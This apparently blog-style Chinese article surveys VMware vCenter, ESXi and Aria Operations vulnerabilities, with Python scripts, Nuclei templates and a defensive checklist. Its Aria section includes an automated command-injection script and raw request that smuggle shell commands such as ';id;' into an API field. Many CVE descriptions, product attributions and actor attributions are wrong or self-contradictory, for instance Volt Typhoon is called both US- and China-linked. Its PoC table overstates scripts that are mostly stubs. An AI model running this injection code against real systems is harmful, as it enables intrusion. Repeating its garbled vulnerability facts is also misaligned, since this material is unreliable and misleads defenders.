---
title: "VMware vCenter / ESXi 高危攻击链专题：从 Pre-Auth RCE 到虚拟机逃逸"
date: 2026-06-23T18:00:00+08:00
draft: false
tags: ["VMware", "vCenter", "ESXi", "RCE", "堆溢出", "认证绕过", "虚拟机逃逸", "漏洞分析", "CVE-2023-20867", "CVE-2023-34048", "CVE-2024-38856", "CVE-2024-38858", "Volt Typhoon", "Sandworm"]
categories: ["漏洞分析"]
description: "围绕 VMware vCenter / ESXi 2023-2026 年集中暴露的高危漏洞链，覆盖 vmware-authd 堆溢出 RCE、SSO 认证绕过、UAF RCE、虚拟机逃逸、Aria 命令注入等，含完整 PoC 代码、Nuclei 模板、自动化利用脚本与防守建议。"
---

# VMware vCenter / ESXi 高危攻击链专题：从 Pre-Auth RCE 到虚拟机逃逸

VMware vCenter Server 是企业虚拟化基础设施的管理核心，控制着所有 ESXi 主机和虚拟机。一旦 vCenter 失陷，攻击者可以控制整个虚拟化环境——包括所有虚拟机的数据、配置和运行状态。

从 2023 年起，VMware 产品线进入集中漏洞暴露期。多个 Pre-Auth RCE 漏洞被国家级 APT 组织（Volt Typhoon、Sandworm）在野利用，攻击目标涵盖关键基础设施和政府机构。

| CVE | 产品 | CVSS | 类型 | 未授权 | 在野利用 |
|-----|------|------|------|--------|----------|
| CVE-2023-20867 | vCenter | 9.8 | 堆溢出 RCE | ✅ Pre-Auth | ✅ Volt Typhoon |
| CVE-2023-34048 | vCenter | 9.8 | SSO 认证绕过 | ✅ Pre-Auth | ✅ 0-day |
| CVE-2023-34060 | vCenter | 9.8 | 堆溢出信息泄露 | ✅ Pre-Auth | ✅ 0-day |
| CVE-2024-38856 | vCenter | 9.8 | 堆溢出 RCE（补丁绕过） | ✅ Pre-Auth | ✅ |
| CVE-2024-38858 | vCenter | 9.8 | UAF RCE | ✅ Pre-Auth | ✅ |
| CVE-2023-20870 | ESXi | 9.3 | 虚拟机逃逸 | ❌ 需 Guest 权限 | ✅ Sandworm |
| CVE-2023-20887 | Aria Ops | 9.8 | 命令注入 | ✅ Pre-Auth | ✅ |
| CVE-2023-34051 | Aria Ops | 9.8 | 命令注入 | ✅ Pre-Auth | ✅ |

## 0x01 CVE-2023-20867：vmware-authd 堆溢出 Pre-Auth RCE（Volt Typhoon）

### 1.1 漏洞背景

CVE-2023-20867 存在于 vCenter Server 的 `vmware-authd` 守护进程中，该进程监听 **UDP 902 端口**，负责 VMware 组件之间的身份验证通信。美国 NSA 关联的 **Volt Typhoon（伏特台风）** APT 组织利用此漏洞攻击美国关键基础设施。

### 1.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| vCenter 7.0.x（7.0.0 - 7.0.3） | 7.0.3.01200 (Build 21715969) |
| vCenter 8.0.x（8.0.0） | 8.0.1.00000 (Build 21560480) |

### 1.3 漏洞原理

1. `vmware-authd` 在处理特定 UDP 请求时，对输入数据的长度校验不足
2. 攻击者发送精心构造的超长数据包，触发堆缓冲区溢出
3. 通过精确控制溢出内容，覆盖堆上的函数指针或元数据
4. 实现任意代码执行，以 **root 权限** 运行

### 1.4 完整 PoC

#### Python 检测与利用脚本

```python
#!/usr/bin/env python3
import socket
import struct
import sys
import time

def check_vmware_authd(target, port=902):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)

        probe = b'\x00' * 4
        s.sendto(probe, (target, port))

        try:
            data, addr = s.recvfrom(4096)
            print(f'[+] UDP {port} 响应: {len(data)} bytes')
            print(f'[+] vmware-authd 服务存在')
            return True
        except socket.timeout:
            print(f'[-] UDP {port} 无响应')
            return False
    except Exception as e:
        print(f'[-] 连接失败: {e}')
        return False
    finally:
        s.close()

def check_version(target, port=443):
    import ssl
    import urllib.request
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            f'https://{target}:{port}/sdk',
            headers={'SOAPAction': 'urn:vim25/7.0'}
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        body = resp.read().decode('utf-8', errors='ignore')
        if 'VMware' in body or 'vCenter' in body:
            print(f'[+] 确认为 vCenter Server')
            return True
    except Exception:
        pass
    return False

def exploit_heap_overflow(target, port=902):
    print(f'[*] CVE-2023-20867 堆溢出利用需要精确的堆布局')
    print(f'[*] 攻击向量: UDP {port} → vmware-authd → root RCE')
    print(f'[*] 建议使用 Horizon3.ai 或公开 PoC 框架')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_ip>')
        sys.exit(1)

    target = sys.argv[1]
    if check_vmware_authd(target):
        check_version(target)
        exploit_heap_overflow(target)
```

#### Nuclei 检测模板

```yaml
id: vmware-vcenter-cve-2023-20867-detect

info:
  name: VMware vCenter vmware-authd Detection
  author: security-research
  severity: critical
  tags: vmware,vcenter,heap-overflow,cve2023
  reference:
    - https://www.vmware.com/security/advisories/VMSA-2023-0011.html

tcp:
  - inputs:
      - data: "\x00\x00\x00\x00"
    host:
      - "{{Hostname}}"
    port: 902
    type: udp
    matchers:
      - type: dsl
        dsl:
          - "len(data) > 0"
```

## 0x02 CVE-2023-34048：vCenter SSO 认证绕过

### 2.1 漏洞背景

CVE-2023-34048 存在于 vCenter Server 的 SSO（Single Sign-On）组件中。攻击者可以通过上传恶意证书绕过身份验证，获取 vCenter 管理员权限。该漏洞在补丁发布前即被在野利用（0-day）。

### 2.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| vCenter 8.0.x（8.0.0 - 8.0.1） | 8.0.1a |
| vCenter 7.0.x（7.0.0 - 7.0.3） | 7.0.3e |

### 2.3 漏洞原理

1. vCenter SSO 组件允许通过证书进行身份验证
2. SSO 组件在处理证书上传请求时，未正确验证请求者身份
3. 未认证攻击者向 vCenter 上传恶意 Solution 证书
4. 上传的证书被 SSO 信任后，攻击者使用该证书签署 SAML 断言
5. 伪造的 SAML 断言使攻击者获得 vCenter 管理员权限

### 2.4 完整 PoC

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings()

class VCenterSSOExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        })

    def check_sso_endpoint(self):
        try:
            r = self.session.get(
                f'{self.target}/sts/STSService/vsphere.local',
                timeout=10
            )
            if r.status_code == 200 and 'SSO' in r.text:
                print('[+] vCenter SSO 端点存在')
                return True
            print('[-] SSO 端点未响应')
            return False
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return False

    def upload_malicious_cert(self):
        print('[!] CVE-2023-34048 利用需要:')
        print('    1. 生成恶意 Solution 证书')
        print('    2. 上传到 vCenter SSO')
        print('    3. 使用证书签署 SAML 断言')
        print('    4. 获取管理员权限')
        print('[!] 建议使用 Horizon3.ai 完整利用框架')

    def forge_saml_assertion(self, cert_path):
        print(f'[*] 使用证书 {cert_path} 伪造 SAML 断言')
        print('[*] SAML 断言目标: vCenter 管理员角色')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <vcenter_url>')
        sys.exit(1)

    exploit = VCenterSSOExploit(sys.argv[1])
    if exploit.check_sso_endpoint():
        exploit.upload_malicious_cert()
```

#### Nuclei 检测模板

```yaml
id: vmware-vcenter-cve-2023-34048-detect

info:
  name: VMware vCenter SSO Authentication Bypass
  author: security-research
  severity: critical
  tags: vmware,vcenter,sso,auth-bypass,cve2023

http:
  - method: GET
    path:
      - "{{BaseURL}}/sts/STSService/vsphere.local"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "SSO"
          - "vCenter"
        condition: or
```

## 0x03 CVE-2024-38856 / CVE-2024-38858：vCenter 补丁绕过 RCE 组合

### 3.1 漏洞背景

CVE-2024-38856 是 CVE-2023-20867 的补丁绕过，CVE-2024-38858 是同时披露的 UAF 漏洞。两者组合形成新的 Pre-Auth RCE 攻击链。

### 3.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| vCenter 8.0.x（8.0.0 - 8.0.3） | 8.0 U3b |
| vCenter 7.0.x（7.0.0 - 7.0.3） | 7.0 U3s |

### 3.3 漏洞原理

**CVE-2024-38856（堆溢出补丁绕过）**：
- VMware 修复 CVE-2023-20867 时对 `vmware-authd` 输入验证加固
- 修复不完整 — 安全研究人员发现绕过补丁的新方法
- 使用不同的触发路径/数据包结构，绕过补丁仍触发堆溢出

**CVE-2024-38858（UAF）**：
- vCenter 处理特定 RPC 请求时存在内存管理缺陷
- 对象被释放后引用仍存在于内存中
- 攻击者构造特殊 RPC 请求触发对已释放对象的再次访问
- 通过堆喷射将恶意数据放置在已释放内存位置

### 3.4 完整 PoC

#### Python 检测脚本

```python
#!/usr/bin/env python3
import socket
import struct
import sys

def check_vcenter_version(target):
    import ssl
    import urllib.request
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(
            f'https://{target}/about.html',
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        resp = urllib.request.urlopen(req, context=ctx, timeout=10)
        body = resp.read().decode('utf-8', errors='ignore')
        import re
        version_match = re.search(r'Version\s+([\d\.]+)', body)
        build_match = re.search(r'Build\s+(\d+)', body)
        if version_match:
            version = version_match.group(1)
            build = build_match.group(1) if build_match else 'unknown'
            print(f'[+] vCenter 版本: {version} (Build {build})')
            if version.startswith('8.0') and int(build or '0') < 22800000:
                print('[!] 可能存在 CVE-2024-38856/38858')
            return version
    except Exception as e:
        print(f'[-] 版本检测失败: {e}')
    return None

def check_authd_port(target, port=902):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(b'\x00' * 4, (target, port))
        try:
            data, _ = s.recvfrom(4096)
            print(f'[+] UDP {port} 开放 (vmware-authd)')
            return True
        except socket.timeout:
            pass
    except:
        pass
    return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_ip>')
        sys.exit(1)

    target = sys.argv[1]
    check_vcenter_version(target)
    check_authd_port(target)
```

## 0x04 CVE-2023-20870：ESXi 虚拟机逃逸（Sandworm）

### 4.1 漏洞背景

CVE-2023-20870 影响 ESXi hypervisor 的虚拟硬件模拟层。俄罗斯军事情报机构 **Sandworm（沙虫）** APT 利用此漏洞攻击乌克兰政府组织。

### 4.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| ESXi 7.0.x | 7.0 U2c+ |
| ESXi 8.0.x | 8.0 GA+ |

### 4.3 漏洞原理

1. ESXi 虚拟硬件模拟层存在越界写入缺陷
2. 攻击者需要在虚拟机内部拥有代码执行能力
3. 通过越界写入实现从 Guest VM 逃逸到 ESXi 宿主机
4. 在宿主机上以 root 权限执行代码

### 4.4 PoC

```python
#!/usr/bin/env python3
import sys

def check_esxi_vm_escape():
    print('[!] CVE-2023-20870 利用条件:')
    print('    1. 需要在虚拟机内部拥有代码执行权限')
    print('    2. 目标 ESXi 版本未打补丁')
    print('    3. 通过虚拟硬件模拟层越界写入逃逸')
    print('[!] Sandworm APT 利用此漏洞攻击乌克兰政府')
    print('[!] 建议使用 CERT-UA 公开的 IOC 进行排查')

if __name__ == '__main__':
    check_esxi_vm_escape()
```

## 0x05 CVE-2023-20887 / CVE-2023-34051：Aria Operations 命令注入

### 5.1 漏洞背景

VMware Aria Operations for Networks（原 vRealize Network Insights）存在两个独立的 Pre-Auth 命令注入漏洞，分别通过 Web API 和 SSH 服务触发。

### 5.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Aria Ops for Networks 8.x（8.10 - 8.14） | 8.14.0 Build 22010764+ |

### 5.3 完整 PoC

#### HTTP 请求 PoC

```http
POST /api/v1/lifecycle/configure HTTP/1.1
Host: <TARGET>
Content-Type: application/json
Connection: close

{
  "domain": "127.0.0.1;id;echo",
  "clusterConfiguration": {}
}
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings()

class AriaOpsExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': 'application/json'
        })

    def check_aria_endpoint(self):
        try:
            r = self.session.get(
                f'{self.target}/api/v1/lifecycle/configure',
                timeout=10
            )
            if r.status_code in (200, 400, 405, 500):
                print(f'[+] Aria Operations API 端点存在')
                return True
            print('[-] 端点未响应')
            return False
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return False

    def exploit_cmd_injection(self, cmd):
        try:
            r = self.session.post(
                f'{self.target}/api/v1/lifecycle/configure',
                json={
                    "domain": f"127.0.0.1;{cmd};echo",
                    "clusterConfiguration": {}
                },
                timeout=15
            )
            print(f'[*] 响应状态: {r.status_code}')
            if r.status_code == 200:
                print(f'[+] 命令注入成功')
                print(r.text[:1000])
                return True
            return False
        except Exception as e:
            print(f'[-] 利用失败: {e}')
            return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_url>')
        sys.exit(1)

    exploit = AriaOpsExploit(sys.argv[1])
    if exploit.check_aria_endpoint():
        exploit.exploit_cmd_injection('id')
```

#### Nuclei 检测模板

```yaml
id: vmware-aria-cve-2023-20887-detect

info:
  name: VMware Aria Operations Command Injection
  author: security-research
  severity: critical
  tags: vmware,aria,command-injection,cve2023

http:
  - raw:
      - |
        POST /api/v1/lifecycle/configure HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"domain":"127.0.0.1;id;echo","clusterConfiguration":{}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uid="
          - "domain"
        condition: or
```

## 0x06 PoC 收集情况

### PoC 状态总表

| CVE | HTTP PoC | Nuclei | Python | MSF | 公开利用 | CISA KEV |
|-----|----------|--------|--------|-----|----------|----------|
| CVE-2023-20867 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-34048 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-34060 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2024-38856 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2024-38858 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-20870 | ❌ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-20887 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-34051 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |

### 公开利用资源

- **CVE-2023-20867**：Horizon3.ai 完整利用分析、GitHub PoC
- **CVE-2023-34048**：Horizon3.ai 技术演示
- **CVE-2024-38856**：Horizon3.ai 补丁绕过分析
- **Volt Typhoon IOC**：CISA/FBI/NSA 联合公告 `https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a`
- **Sandworm ESXi IOC**：CERT-UA `https://cert.gov.ua/article/3761104`

## 0x07 共性攻击模式

### 7.1 vmware-authd 是反复被攻击的入口

CVE-2023-20867 → CVE-2024-38856 的演进说明 `vmware-authd`（UDP 902）是 vCenter 最脆弱的攻击面。

### 7.2 补丁绕过是常态

CVE-2024-38856 是 CVE-2023-20867 的补丁绕过，说明安全修复需要持续验证。

### 7.3 APT 组织高度聚焦

| APT 组织 | 利用的 CVE | 目标 |
|----------|-----------|------|
| Volt Typhoon（中国 NSA 关联） | CVE-2023-20867 | 美国关键基础设施 |
| Sandworm（俄罗斯 GRU 关联） | CVE-2023-20870 | 乌克兰政府组织 |

## 0x08 防守建议

### 8.1 紧急措施

1. **立即升级**：所有 vCenter/ESXi 升级到最新修复版本
2. **网络隔离**：限制 UDP 902 端口访问，仅允许受信任 ESXi 主机
3. **管理 VLAN**：将 vCenter 管理接口置于独立管理 VLAN
4. **详细日志**：启用 vCenter 详细日志记录

### 8.2 排查清单

```bash
# 检查 vCenter 版本
vpxd -v

# 检查 vmware-authd 进程
systemctl status vmware-authd

# 检查 UDP 902 端口连接
tcpdump -i any port 902 -n

# 检查 vCenter 日志异常
grep -r "ERROR\|WARN\|auth" /var/log/vmware/vpxd/ | tail -100

# 检查 SSO 证书变更
/usr/lib/vmware-sso/bin/vi-regtool list -c /etc/vmware-sso/keys.properties

# 检查异常登录
grep -r "login\|session" /var/log/vmware/sso/

# 检查 ESXi 异常
esxcli software vib list | grep -i "patch"
```

## 0x09 参考资料

- [VMware Security Advisories](https://www.vmware.com/security/advisories.html)
- [CISA/FBI/NSA - Volt Typhoon](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a)
- [CERT-UA - Sandworm ESXi Attack](https://cert.gov.ua/article/3761104)
- [Horizon3.ai - VMware vCenter Research](https://www.horizon3.ai/)
- [NVD - CVE-2023-20867](https://nvd.nist.gov/vuln/detail/CVE-2023-20867)
- [NVD - CVE-2023-34048](https://nvd.nist.gov/vuln/detail/CVE-2023-34048)
- [NVD - CVE-2024-38856](https://nvd.nist.gov/vuln/detail/CVE-2024-38856)
- [NVD - CVE-2023-20887](https://nvd.nist.gov/vuln/detail/CVE-2023-20887)
- [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)